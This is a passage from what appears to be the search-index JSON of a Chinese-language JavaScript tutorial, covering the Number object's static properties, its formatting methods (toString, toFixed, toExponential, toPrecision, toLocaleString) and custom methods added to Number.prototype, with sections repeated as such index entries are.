Number.prototype.toFixed() \u00b6 toFixed() \u65b9\u6cd5\u5148\u5c06\u4e00\u4e2a\u6570\u8f6c\u4e3a\u6307\u5b9a\u4f4d\u6570\u7684\u5c0f\u6570\uff0c\u7136\u540e\u8fd4\u56de\u8fd9\u4e2a\u5c0f\u6570\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 1 2 ( 10 ). toFixed ( 2 ) // \"10.00\" 10.005 . toFixed ( 2 ) // \"10.01\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 10 \u548c 10.005 \u5148\u8f6c\u62102\u4f4d\u5c0f\u6570\uff0c\u7136\u540e\u8f6c\u6210\u5b57\u7b26\u4e32\u3002\u5176\u4e2d 10 \u5fc5\u987b\u653e\u5728\u62ec\u53f7\u91cc\uff0c\u5426\u5219\u540e\u9762\u7684\u70b9\u4f1a\u88ab\u5904\u7406\u6210\u5c0f\u6570\u70b9\u3002 toFixed() \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u5c0f\u6570\u4f4d\u6570\uff0c\u6709\u6548\u8303\u56f4\u4e3a0\u5230100\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u5c06\u629b\u51fa RangeError \u9519\u8bef\u3002 \u7531\u4e8e\u6d6e\u70b9\u6570\u7684\u539f\u56e0\uff0c\u5c0f\u6570 5 \u7684\u56db\u820d\u4e94\u5165\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u4f7f\u7528\u7684\u65f6\u5019\u5fc5\u987b\u5c0f\u5fc3\u3002 1 2 ( 10.055 ). toFixed ( 2 ) // 10.05 ( 10.005 ). toFixed ( 2 ) // 10.01 Number.prototype.toExponential() \u00b6 toExponential \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u6570\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u5f62\u5f0f\u3002 1 2 3 4 5 6 7 ( 10 ). toExponential () // \"1e+1\" ( 10 ). toExponential ( 1 ) // \"1.0e+1\" ( 10 ). toExponential ( 2 ) // \"1.00e+1\" ( 1234 ). toExponential () // \"1.234e+3\" ( 1234 ). toExponential ( 1 ) // \"1.2e+3\" ( 1234 ). toExponential ( 2 ) // \"1.23e+3\" toExponential \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5c0f\u6570\u70b9\u540e\u6709\u6548\u6570\u5b57\u7684\u4f4d\u6570\uff0c\u8303\u56f4\u4e3a0\u5230100\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a RangeError \u9519\u8bef\u3002 Number.prototype.toPrecision() \u00b6 Number.prototype.toPrecision() \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u6570\u8f6c\u4e3a\u6307\u5b9a\u4f4d\u6570\u7684\u6709\u6548\u6570\u5b57\u3002 1 2 3 4 5 ( 12.34 ). toPrecision ( 1 ) // \"1e+1\" ( 12.34 ). toPrecision ( 2 ) // \"12\" ( 12.34 ). toPrecision ( 3 ) // \"12.3\" ( 12.34 ). toPrecision ( 4 ) // \"12.34\" ( 12.34 ). toPrecision ( 5 ) // \"12.340\" \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u6709\u6548\u6570\u5b57\u7684\u4f4d\u6570\uff0c\u8303\u56f4\u662f1\u5230100\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u4f1a\u629b\u51fa RangeError \u9519\u8bef\u3002 \u8be5\u65b9\u6cd5\u7528\u4e8e\u56db\u820d\u4e94\u5165\u65f6\u4e0d\u592a\u53ef\u9760\uff0c\u8ddf\u6d6e\u70b9\u6570\u4e0d\u662f\u7cbe\u786e\u50a8\u5b58\u6709\u5173\u3002 1 2 3 4 ( 12.35 ). toPrecision ( 3 ) // \"12.3\" ( 12.25 ). toPrecision ( 3 ) // \"12.3\" ( 12.15 ). toPrecision ( 3 ) // \"12.2\" ( 12.45 ). toPrecision ( 3 ) // \"12.4\" Number.prototype.toLocaleString() \u00b6 Number.prototype.toLocaleString() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5730\u533a\u7801\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6570\u5b57\u5728\u8be5\u5730\u533a\u7684\u5f53\u5730\u4e66\u5199\u5f62\u5f0f\u3002 1 2 ( 123 ). toLocaleString ( 'zh-Hans-CN-u-nu-hanidec' ) // \"\u4e00\u4e8c\u4e09\" \u8be5\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\u914d\u7f6e\u5bf9\u8c61\uff0c\u7528\u6765\u5b9a\u5236\u6307\u5b9a\u7528\u9014\u7684\u8fd4\u56de\u5b57\u7b26\u4e32\u3002\u8be5\u5bf9\u8c61\u7684 style \u5c5e\u6027\u6307\u5b9a\u8f93\u51fa\u6837\u5f0f\uff0c\u9ed8\u8ba4\u503c\u662f decimal \uff0c\u8868\u793a\u8f93\u51fa\u5341\u8fdb\u5236\u5f62\u5f0f\u3002\u5982\u679c\u503c\u4e3a percent \uff0c\u8868\u793a\u8f93\u51fa\u767e\u5206\u6570\u3002 1 2 ( 123 ). toLocaleString ( 'zh-Hans-CN' , { style : 'percent' }) // \"12,300%\" \u5982\u679c style \u5c5e\u6027\u7684\u503c\u4e3a currency \uff0c\u5219\u53ef\u4ee5\u642d\u914d currency \u5c5e\u6027\uff0c\u8f93\u51fa\u6307\u5b9a\u683c\u5f0f\u7684\u8d27\u5e01\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 5 6 7 8 ( 123 ). toLocaleString ( 'zh-Hans-CN' , { style : 'currency' , currency : 'CNY' }) // \"\uffe5123.00\" ( 123 ). toLocaleString ( 'de-DE' , { style : 'currency' , currency : 'EUR' }) // \"123,00 \u20ac\" ( 123 ). toLocaleString ( 'en-US' , { style : 'currency' , currency : 'USD' }) // \"$123.00\" \u5982\u679c Number.prototype.toLocaleString() \u7701\u7565\u4e86\u53c2\u6570\uff0c\u5219\u7531\u6d4f\u89c8\u5668\u81ea\u884c\u51b3\u5b9a\u5982\u4f55\u5904\u7406\uff0c\u901a\u5e38\u4f1a\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u5730\u533a\u8bbe\u5b9a\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u5982\u679c\u4f7f\u7528\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\u7684\u5730\u533a\u7801\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 1 ( 123 ). toLocaleString ( '123' ) // \u51fa\u9519 \u81ea\u5b9a\u4e49\u65b9\u6cd5 \u00b6 \u4e0e\u5176\u4ed6\u5bf9\u8c61\u4e00\u6837\uff0c Number.prototype \u5bf9\u8c61\u4e0a\u9762\u53ef\u4ee5\u81ea\u5b9a\u4e49\u65b9\u6cd5\uff0c\u88ab Number \u7684\u5b9e\u4f8b\u7ee7\u627f\u3002 1 2 3 4 5 Number . prototype . add = function ( x ) { return this + x ; }; 8 [ 'add' ]( 2 ) // 10 \u4e0a\u9762\u4ee3\u7801\u4e3a Number \u5bf9\u8c61\u5b9e\u4f8b\u5b9a\u4e49\u4e86\u4e00\u4e2a add \u65b9\u6cd5\u3002\u5728\u6570\u503c\u4e0a\u8c03\u7528\u67d0\u4e2a\u65b9\u6cd5\uff0c\u6570\u503c\u4f1a\u81ea\u52a8\u8f6c\u4e3a Number \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8c03\u7528 add \u65b9\u6cd5\u4e86\u3002\u7531\u4e8e add \u65b9\u6cd5\u8fd4\u56de\u7684\u8fd8\u662f\u6570\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u94fe\u5f0f\u8fd0\u7b97\u3002 1 2 3 4 5 6 Number . prototype . subtract = function ( x ) { return this - x ; }; ( 8 ). add ( 2 ). subtract ( 4 ) // 6 \u4e0a\u9762\u4ee3\u7801\u5728 Number \u5bf9\u8c61\u7684\u5b9e\u4f8b\u4e0a\u90e8\u7f72\u4e86 subtract \u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u4e0e add \u65b9\u6cd5\u94fe\u5f0f\u8c03\u7528\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u90e8\u7f72\u66f4\u590d\u6742\u7684\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 Number . prototype . iterate = function () { var result = []; for ( var i = 0 ; i <= this ; i ++ ) { result . push ( i ); } return result ; }; ( 8 ). iterate () // [0, 1, 2, 3, 4, 5, 6, 7, 8] \u4e0a\u9762\u4ee3\u7801\u5728 Number \u5bf9\u8c61\u7684\u539f\u578b\u4e0a\u90e8\u7f72\u4e86 iterate \u65b9\u6cd5\uff0c\u5c06\u4e00\u4e2a\u6570\u503c\u81ea\u52a8\u904d\u5386\u4e3a\u4e00\u4e2a\u6570\u7ec4\u3002 \u6ce8\u610f\uff0c\u6570\u503c\u7684\u81ea\u5b9a\u4e49\u65b9\u6cd5\uff0c\u53ea\u80fd\u5b9a\u4e49\u5728\u5b83\u7684\u539f\u578b\u5bf9\u8c61 Number.prototype \u4e0a\u9762\uff0c\u6570\u503c\u672c\u8eab\u662f\u65e0\u6cd5\u81ea\u5b9a\u4e49\u5c5e\u6027\u7684\u3002 1 2 3 var n = 1 ; n . x = 1 ; n . x // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c n \u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u6570\u503c\u3002\u76f4\u63a5\u5728\u5b83\u4e0a\u9762\u65b0\u589e\u4e00\u4e2a\u5c5e\u6027 x \uff0c\u4e0d\u4f1a\u62a5\u9519\uff0c\u4f46\u6beb\u65e0\u4f5c\u7528\uff0c\u603b\u662f\u8fd4\u56de undefined \u3002\u8fd9\u662f\u56e0\u4e3a\u4e00\u65e6\u88ab\u8c03\u7528\u5c5e\u6027\uff0c n \u5c31\u81ea\u52a8\u8f6c\u4e3a Number \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8c03\u7528\u7ed3\u675f\u540e\uff0c\u8be5\u5bf9\u8c61\u81ea\u52a8\u9500\u6bc1\u3002\u6240\u4ee5\uff0c\u4e0b\u4e00\u6b21\u8c03\u7528 n \u7684\u5c5e\u6027\u65f6\uff0c\u5b9e\u9645\u53d6\u5230\u7684\u662f\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c5e\u6027 x \u5f53\u7136\u5c31\u8bfb\u4e0d\u51fa\u6765\u3002","title":"Number \u5bf9\u8c61"},{"location":"stdlib/number/#number","text":"","title":"Number \u5bf9\u8c61"},{"location":"stdlib/number/#_1","text":"Number \u5bf9\u8c61\u662f\u6570\u503c\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5de5\u5177\u51fd\u6570\u4f7f\u7528\u3002 \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u65f6\uff0c\u5b83\u7528\u4e8e\u751f\u6210\u503c\u4e3a\u6570\u503c\u7684\u5bf9\u8c61\u3002 1 2 var n = new Number ( 1 ); typeof n // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Number \u5bf9\u8c61\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff0c\u8fd4\u56de\u4e00\u4e2a\u503c\u4e3a 1 \u7684\u5bf9\u8c61\u3002 \u4f5c\u4e3a\u5de5\u5177\u51fd\u6570\u65f6\uff0c\u5b83\u53ef\u4ee5\u5c06\u4efb\u4f55\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u6570\u503c\u3002 1 Number ( true ) // 1 \u4e0a\u9762\u4ee3\u7801\u5c06\u5e03\u5c14\u503c true \u8f6c\u4e3a\u6570\u503c 1 \u3002 Number \u4f5c\u4e3a\u5de5\u5177\u51fd\u6570\u7684\u7528\u6cd5\uff0c\u8be6\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002","title":"\u6982\u8ff0"},{"location":"stdlib/number/#_2","text":"Number \u5bf9\u8c61\u62e5\u6709\u4ee5\u4e0b\u4e00\u4e9b\u9759\u6001\u5c5e\u6027\uff08\u5373\u76f4\u63a5\u5b9a\u4e49\u5728 Number \u5bf9\u8c61\u4e0a\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u5728\u5b9e\u4f8b\u4e0a\u7684\u5c5e\u6027\uff09\u3002 Number.POSITIVE_INFINITY \uff1a\u6b63\u7684\u65e0\u9650\uff0c\u6307\u5411 Infinity \u3002 Number.NEGATIVE_INFINITY \uff1a\u8d1f\u7684\u65e0\u9650\uff0c\u6307\u5411 -Infinity \u3002 Number.NaN \uff1a\u8868\u793a\u975e\u6570\u503c\uff0c\u6307\u5411 NaN \u3002 Number.MIN_VALUE \uff1a\u8868\u793a\u6700\u5c0f\u7684\u6b63\u6570\uff08\u5373\u6700\u63a5\u8fd10\u7684\u6b63\u6570\uff0c\u572864\u4f4d\u6d6e\u70b9\u6570\u4f53\u7cfb\u4e2d\u4e3a 5e-324 \uff09\uff0c\u76f8\u5e94\u7684\uff0c\u6700\u63a5\u8fd10\u7684\u8d1f\u6570\u4e3a -Number.MIN_VALUE \u3002 Number.MAX_SAFE_INTEGER \uff1a\u8868\u793a\u80fd\u591f\u7cbe\u786e\u8868\u793a\u7684\u6700\u5927\u6574\u6570\uff0c\u5373 9007199254740991 \u3002 Number.MIN_SAFE_INTEGER \uff1a\u8868\u793a\u80fd\u591f\u7cbe\u786e\u8868\u793a\u7684\u6700\u5c0f\u6574\u6570\uff0c\u5373 -9007199254740991 \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Number . POSITIVE_INFINITY // Infinity Number . NEGATIVE_INFINITY // -Infinity Number . NaN // NaN Number . MAX_VALUE // 1.7976931348623157e+308 Number . MAX_VALUE < Infinity // true Number . MIN_VALUE // 5e-324 Number . MIN_VALUE > 0 // true Number . MAX_SAFE_INTEGER // 9007199254740991 Number . MIN_SAFE_INTEGER // -9007199254740991","title":"\u9759\u6001\u5c5e\u6027"},{"location":"stdlib/number/#_3","text":"Number \u5bf9\u8c61\u67094\u4e2a\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u90fd\u8ddf\u5c06\u6570\u503c\u8f6c\u6362\u6210\u6307\u5b9a\u683c\u5f0f\u6709\u5173\u3002","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/number/#numberprototypetostring","text":"Number \u5bf9\u8c61\u90e8\u7f72\u4e86\u81ea\u5df1\u7684 toString \u65b9\u6cd5\uff0c\u7528\u6765\u5c06\u4e00\u4e2a\u6570\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 ( 10 ). toString () // \"10\" toString \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u8f93\u51fa\u7684\u8fdb\u5236\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e2a\u53c2\u6570\uff0c\u9ed8\u8ba4\u5c06\u6570\u503c\u5148\u8f6c\u4e3a\u5341\u8fdb\u5236\uff0c\u518d\u8f93\u51fa\u5b57\u7b26\u4e32\uff1b\u5426\u5219\uff0c\u5c31\u6839\u636e\u53c2\u6570\u6307\u5b9a\u7684\u8fdb\u5236\uff0c\u5c06\u4e00\u4e2a\u6570\u5b57\u8f6c\u5316\u6210\u67d0\u4e2a\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 ( 10 ). toString ( 2 ) // \"1010\" ( 10 ). toString ( 8 ) // \"12\" ( 10 ). toString ( 16 ) // \"a\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 10 \u4e00\u5b9a\u8981\u653e\u5728\u62ec\u53f7\u91cc\uff0c\u8fd9\u6837\u8868\u660e\u540e\u9762\u7684\u70b9\u8868\u793a\u8c03\u7528\u5bf9\u8c61\u5c5e\u6027\u3002\u5982\u679c\u4e0d\u52a0\u62ec\u53f7\uff0c\u8fd9\u4e2a\u70b9\u4f1a\u88ab JavaScript \u5f15\u64ce\u89e3\u91ca\u6210\u5c0f\u6570\u70b9\uff0c\u4ece\u800c\u62a5\u9519\u3002 1 2 10. toString ( 2 ) // SyntaxError: Unexpected token ILLEGAL \u53ea\u8981\u80fd\u591f\u8ba9 JavaScript \u5f15\u64ce\u4e0d\u6df7\u6dc6\u5c0f\u6570\u70b9\u548c\u5bf9\u8c61\u7684\u70b9\u8fd0\u7b97\u7b26\uff0c\u5404\u79cd\u5199\u6cd5\u90fd\u80fd\u7528\u3002\u9664\u4e86\u4e3a 10 \u52a0\u4e0a\u62ec\u53f7\uff0c\u8fd8\u53ef\u4ee5\u5728 10 \u540e\u9762\u52a0\u4e24\u4e2a\u70b9\uff0cJavaScript \u4f1a\u628a\u7b2c\u4e00\u4e2a\u70b9\u7406\u89e3\u6210\u5c0f\u6570\u70b9\uff08\u5373 10.0 \uff09\uff0c\u628a\u7b2c\u4e8c\u4e2a\u70b9\u7406\u89e3\u6210\u8c03\u7528\u5bf9\u8c61\u5c5e\u6027\uff0c\u4ece\u800c\u5f97\u5230\u6b63\u786e\u7ed3\u679c\u3002 1 2 3 4 5 6 10. . toString ( 2 ) // \"1010\" // \u5176\u4ed6\u65b9\u6cd5\u8fd8\u5305\u62ec 10 . toString ( 2 ) // \"1010\" 10.0 . toString ( 2 ) // \"1010\" \u8fd9\u5b9e\u9645\u4e0a\u610f\u5473\u7740\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bf9\u4e00\u4e2a\u5c0f\u6570\u4f7f\u7528 toString \u65b9\u6cd5\u3002 1 2 3 4 10.5 . toString () // \"10.5\" 10.5 . toString ( 2 ) // \"1010.1\" 10.5 . toString ( 8 ) // \"12.4\" 10.5 . toString ( 16 ) // \"a.8\" \u901a\u8fc7\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u4e5f\u53ef\u4ee5\u8c03\u7528 toString \u65b9\u6cd5\u3002 1 10 [ 'toString' ]( 2 ) // \"1010\" toString \u65b9\u6cd5\u53ea\u80fd\u5c06\u5341\u8fdb\u5236\u7684\u6570\uff0c\u8f6c\u4e3a\u5176\u4ed6\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u8981\u5c06\u5176\u4ed6\u8fdb\u5236\u7684\u6570\uff0c\u8f6c\u56de\u5341\u8fdb\u5236\uff0c\u9700\u8981\u4f7f\u7528 parseInt \u65b9\u6cd5\u3002","title":"Number.prototype.toString()"},{"location":"stdlib/number/#numberprototypetofixed","text":"toFixed() \u65b9\u6cd5\u5148\u5c06\u4e00\u4e2a\u6570\u8f6c\u4e3a\u6307\u5b9a\u4f4d\u6570\u7684\u5c0f\u6570\uff0c\u7136\u540e\u8fd4\u56de\u8fd9\u4e2a\u5c0f\u6570\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 1 2 ( 10 ). toFixed ( 2 ) // \"10.00\" 10.005 . toFixed ( 2 ) // \"10.01\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 10 \u548c 10.005 \u5148\u8f6c\u62102\u4f4d\u5c0f\u6570\uff0c\u7136\u540e\u8f6c\u6210\u5b57\u7b26\u4e32\u3002\u5176\u4e2d 10 \u5fc5\u987b\u653e\u5728\u62ec\u53f7\u91cc\uff0c\u5426\u5219\u540e\u9762\u7684\u70b9\u4f1a\u88ab\u5904\u7406\u6210\u5c0f\u6570\u70b9\u3002 toFixed() \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u5c0f\u6570\u4f4d\u6570\uff0c\u6709\u6548\u8303\u56f4\u4e3a0\u5230100\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u5c06\u629b\u51fa RangeError \u9519\u8bef\u3002 \u7531\u4e8e\u6d6e\u70b9\u6570\u7684\u539f\u56e0\uff0c\u5c0f\u6570 5 \u7684\u56db\u820d\u4e94\u5165\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u4f7f\u7528\u7684\u65f6\u5019\u5fc5\u987b\u5c0f\u5fc3\u3002 1 2 ( 10.055 ). toFixed ( 2 ) // 10.05 ( 10.005 ). toFixed ( 2 ) // 10.01","title":"Number.prototype.toFixed()"},{"location":"stdlib/number/#numberprototypetoexponential","text":"toExponential \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u6570\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u5f62\u5f0f\u3002 1 2 3 4 5 6 7 ( 10 ). toExponential () // \"1e+1\" ( 10 ). toExponential ( 1 ) // \"1.0e+1\" ( 10 ). toExponential ( 2 ) // \"1.00e+1\" ( 1234 ). toExponential () // \"1.234e+3\" ( 1234 ). toExponential ( 1 ) // \"1.2e+3\" ( 1234 ). toExponential ( 2 ) // \"1.23e+3\" toExponential \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5c0f\u6570\u70b9\u540e\u6709\u6548\u6570\u5b57\u7684\u4f4d\u6570\uff0c\u8303\u56f4\u4e3a0\u5230100\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a RangeError \u9519\u8bef\u3002","title":"Number.prototype.toExponential()"},{"location":"stdlib/number/#numberprototypetoprecision","text":"Number.prototype.toPrecision() \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u6570\u8f6c\u4e3a\u6307\u5b9a\u4f4d\u6570\u7684\u6709\u6548\u6570\u5b57\u3002 1 2 3 4 5 ( 12.34 ). toPrecision ( 1 ) // \"1e+1\" ( 12.34 ). toPrecision ( 2 ) // \"12\" ( 12.34 ). toPrecision ( 3 ) // \"12.3\" ( 12.34 ). toPrecision ( 4 ) // \"12.34\" ( 12.34 ). toPrecision ( 5 ) // \"12.340\" \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u6709\u6548\u6570\u5b57\u7684\u4f4d\u6570\uff0c\u8303\u56f4\u662f1\u5230100\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u4f1a\u629b\u51fa RangeError \u9519\u8bef\u3002 \u8be5\u65b9\u6cd5\u7528\u4e8e\u56db\u820d\u4e94\u5165\u65f6\u4e0d\u592a\u53ef\u9760\uff0c\u8ddf\u6d6e\u70b9\u6570\u4e0d\u662f\u7cbe\u786e\u50a8\u5b58\u6709\u5173\u3002 1 2 3 4 ( 12.35 ). toPrecision ( 3 ) // \"12.3\" ( 12.25 ). toPrecision ( 3 ) // \"12.3\" ( 12.15 ). toPrecision ( 3 ) // \"12.2\" ( 12.45 ). toPrecision ( 3 ) // \"12.4\"","title":"Number.prototype.toPrecision()"},{"location":"stdlib/number/#numberprototypetolocalestring","text":"Number.prototype.toLocaleString() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5730\u533a\u7801\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6570\u5b57\u5728\u8be5\u5730\u533a\u7684\u5f53\u5730\u4e66\u5199\u5f62\u5f0f\u3002 1 2 ( 123 ). toLocaleString ( 'zh-Hans-CN-u-nu-hanidec' ) // \"\u4e00\u4e8c\u4e09\" \u8be5\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\u914d\u7f6e\u5bf9\u8c61\uff0c\u7528\u6765\u5b9a\u5236\u6307\u5b9a\u7528\u9014\u7684\u8fd4\u56de\u5b57\u7b26\u4e32\u3002\u8be5\u5bf9\u8c61\u7684 style \u5c5e\u6027\u6307\u5b9a\u8f93\u51fa\u6837\u5f0f\uff0c\u9ed8\u8ba4\u503c\u662f decimal \uff0c\u8868\u793a\u8f93\u51fa\u5341\u8fdb\u5236\u5f62\u5f0f\u3002\u5982\u679c\u503c\u4e3a percent \uff0c\u8868\u793a\u8f93\u51fa\u767e\u5206\u6570\u3002 1 2 ( 123 ). toLocaleString ( 'zh-Hans-CN' , { style : 'percent' }) // \"12,300%\" \u5982\u679c style \u5c5e\u6027\u7684\u503c\u4e3a currency \uff0c\u5219\u53ef\u4ee5\u642d\u914d currency \u5c5e\u6027\uff0c\u8f93\u51fa\u6307\u5b9a\u683c\u5f0f\u7684\u8d27\u5e01\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 5 6 7 8 ( 123 ). toLocaleString ( 'zh-Hans-CN' , { style : 'currency' , currency : 'CNY' }) // \"\uffe5123.00\" ( 123 ). toLocaleString ( 'de-DE' , { style : 'currency' , currency : 'EUR' }) // \"123,00 \u20ac\" ( 123 ). toLocaleString ( 'en-US' , { style : 'currency' , currency : 'USD' }) // \"$123.00\" \u5982\u679c Number.prototype.toLocaleString() \u7701\u7565\u4e86\u53c2\u6570\uff0c\u5219\u7531\u6d4f\u89c8\u5668\u81ea\u884c\u51b3\u5b9a\u5982\u4f55\u5904\u7406\uff0c\u901a\u5e38\u4f1a\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u5730\u533a\u8bbe\u5b9a\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u5982\u679c\u4f7f\u7528\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\u7684\u5730\u533a\u7801\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 1 ( 123 ). toLocaleString ( '123' ) // \u51fa\u9519","title":"Number.prototype.toLocaleString()"},{"location":"stdlib/number/#_4","text":"\u4e0e\u5176\u4ed6\u5bf9\u8c61\u4e00\u6837\uff0c Number.prototype \u5bf9\u8c61\u4e0a\u9762\u53ef\u4ee5\u81ea\u5b9a\u4e49\u65b9\u6cd5\uff0c\u88ab Number \u7684\u5b9e\u4f8b\u7ee7\u627f\u3002 1 2 3 4 5 Number . prototype . add = function ( x ) { return this + x ; }; 8 [ 'add' ]( 2 ) // 10 \u4e0a\u9762\u4ee3\u7801\u4e3a Number \u5bf9\u8c61\u5b9e\u4f8b\u5b9a\u4e49\u4e86\u4e00\u4e2a add \u65b9\u6cd5\u3002\u5728\u6570\u503c\u4e0a\u8c03\u7528\u67d0\u4e2a\u65b9\u6cd5\uff0c\u6570\u503c\u4f1a\u81ea\u52a8\u8f6c\u4e3a Number \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8c03\u7528 add \u65b9\u6cd5\u4e86\u3002\u7531\u4e8e add \u65b9\u6cd5\u8fd4\u56de\u7684\u8fd8\u662f\u6570\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u94fe\u5f0f\u8fd0\u7b97\u3002 1 2 3 4 5 6 Number . prototype . subtract = function ( x ) { return this - x ; }; ( 8 ). add ( 2 ). subtract ( 4 ) // 6 \u4e0a\u9762\u4ee3\u7801\u5728 Number \u5bf9\u8c61\u7684\u5b9e\u4f8b\u4e0a\u90e8\u7f72\u4e86 subtract \u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u4e0e add \u65b9\u6cd5\u94fe\u5f0f\u8c03\u7528\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u90e8\u7f72\u66f4\u590d\u6742\u7684\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 Number . prototype . iterate = function () { var result = []; for ( var i = 0 ; i <= this ; i ++ ) { result . push ( i ); } return result ; }; ( 8 ). iterate () // [0, 1, 2, 3, 4, 5, 6, 7, 8] \u4e0a\u9762\u4ee3\u7801\u5728 Number \u5bf9\u8c61\u7684\u539f\u578b\u4e0a\u90e8\u7f72\u4e86 iterate \u65b9\u6cd5\uff0c\u5c06\u4e00\u4e2a\u6570\u503c\u81ea\u52a8\u904d\u5386\u4e3a\u4e00\u4e2a\u6570\u7ec4\u3002 \u6ce8\u610f\uff0c\u6570\u503c\u7684\u81ea\u5b9a\u4e49\u65b9\u6cd5\uff0c\u53ea\u80fd\u5b9a\u4e49\u5728\u5b83\u7684\u539f\u578b\u5bf9\u8c61 Number.prototype \u4e0a\u9762\uff0c\u6570\u503c\u672c\u8eab\u662f\u65e0\u6cd5\u81ea\u5b9a\u4e49\u5c5e\u6027\u7684\u3002 1 2 3 var n = 1 ; n . x = 1 ; n . x // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c n \u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u6570\u503c\u3002\u76f4\u63a5\u5728\u5b83\u4e0a\u9762\u65b0\u589e\u4e00\u4e2a\u5c5e\u6027 x \uff0c\u4e0d\u4f1a\u62a5\u9519\uff0c\u4f46\u6beb\u65e0\u4f5c\u7528\uff0c\u603b\u662f\u8fd4\u56de undefined \u3002\u8fd9\u662f\u56e0\u4e3a\u4e00\u65e6\u88ab\u8c03\u7528\u5c5e\u6027\uff0c n \u5c31\u81ea\u52a8\u8f6c\u4e3a Number 